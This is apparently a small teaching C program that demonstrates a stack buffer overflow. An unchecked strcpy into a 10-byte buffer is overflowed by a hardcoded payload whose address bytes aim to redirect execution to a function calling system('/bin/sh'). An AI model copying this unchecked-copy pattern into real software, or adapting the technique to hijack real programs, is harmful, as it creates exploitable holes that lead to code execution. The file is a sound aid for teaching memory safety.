#include <stdio.h>
#include <stdlib.h>

void vulnerableFunction(char* input) {
    char buffer[10];
    strcpy(buffer, input); // Buffer overflow occurs here
}

void dummyFunction() {
    printf("This is a Shell Code.\n");
    int status = system("/bin/sh");
}

int main() {
    char payload[200];
    strcpy(
        payload, 
        "AAAABBBBCCCCDDDDEE\x77\x51\x55\x55\x55\x55\x00\x00GGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ");

    vulnerableFunction(payload);

    return 0;
}

